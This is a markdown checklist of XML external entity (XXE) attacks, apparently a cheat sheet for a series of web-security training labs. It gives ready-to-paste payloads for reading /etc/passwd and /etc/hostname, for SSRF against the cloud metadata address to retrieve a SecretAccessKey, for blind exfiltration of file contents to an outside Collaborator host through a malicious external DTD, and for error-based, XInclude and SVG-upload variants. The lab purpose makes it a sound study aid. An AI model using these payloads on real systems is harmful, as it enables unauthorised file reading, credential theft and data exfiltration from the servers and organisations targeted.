## Recon

- [ ] Intercept all requests while browsing — look for XML bodies or `Content-Type: application/xml`
- [ ] No XML visible? Inject `<>` into stock check parameters and look for XML parse errors (XInclude surface)
- [ ] Check all file upload endpoints — try uploading an SVG file

| Signal                                                                  | Go to            |
| ----------------------------------------------------------------------- | ---------------- |
| XML body in request, response reflects output                           | Labs 1–2         |
| XML body, no output reflected                                           | Labs 3–6 (blind) |
| No XML body, but stock check parameter causes XML parse error with `<>` | Lab 7            |
| File upload accepts SVG                                                 | Lab 8            |

---

## 1. Retrieve files

- [ ] Send stock check request to Repeater
- [ ] Add between XML declaration and `<stockCheck>`:
    
    ```xml
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    ```
    
- [ ] Set `<productId>&xxe;</productId>` → send

---

## 2. SSRF

- [ ] Send stock check request to Repeater
- [ ] Add between XML declaration and `<stockCheck>`:
    
    ```xml
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
    ```
    
- [ ] Set `<productId>&xxe;</productId>` → send
- [ ] Keep appending the returned path segments to the URL until you reach `SecretAccessKey`

---

## 3. Blind — OOB interaction

- [ ] Copy Collaborator subdomain
- [ ] Send stock check to Repeater, inject:
    
    ```xml
    <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://COLLAB-SUBDOMAIN"> ]>
    ```
    
- [ ] Set `<productId>&xxe;</productId>` → send → Poll Collaborator

---

## 4. Blind — OOB via parameter entities

- [ ] Copy Collaborator subdomain
- [ ] Send stock check to Repeater, inject:
    
    ```xml
    <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://COLLAB-SUBDOMAIN"> %xxe; ]>
    ```
    
- [ ] Leave body as-is → send → Poll Collaborator

---

## 5. Blind — exfil via malicious DTD

- [ ] Copy Collaborator subdomain
- [ ] On exploit server, store:
    
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB-SUBDOMAIN/?x=%file;'>">%eval;%exfil;
    ```
    
- [ ] Copy DTD URL → send stock check with:
    
    ```xml
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD-URL"> %xxe;]>
    ```
    
- [ ] Poll Collaborator → grab hostname from `?x=` → submit

---

## 6. Blind — exfil via error messages

- [ ] On exploit server, store:
    
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">%eval;%exfil;
    ```
    
- [ ] Copy DTD URL → send stock check with:
    
    ```xml
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD-URL"> %xxe;]>
    ```
    
- [ ] Read `/etc/passwd` from the error message

---

## 7. XInclude

- [ ] Send request with vulnerable parameter to Repeater
- [ ] Replace parameter value with:
    
    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
    ```
    
- [ ] Send → read `/etc/passwd` from response

---

## 8. SVG file upload

- [ ] Upload an SVG containing:
    
    ```xml
    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" version="1.1">  <text font-size="16" x="0" y="16">&xxe;</text></svg>
    ```
    
- [ ] View the rendered image → hostname appears in the text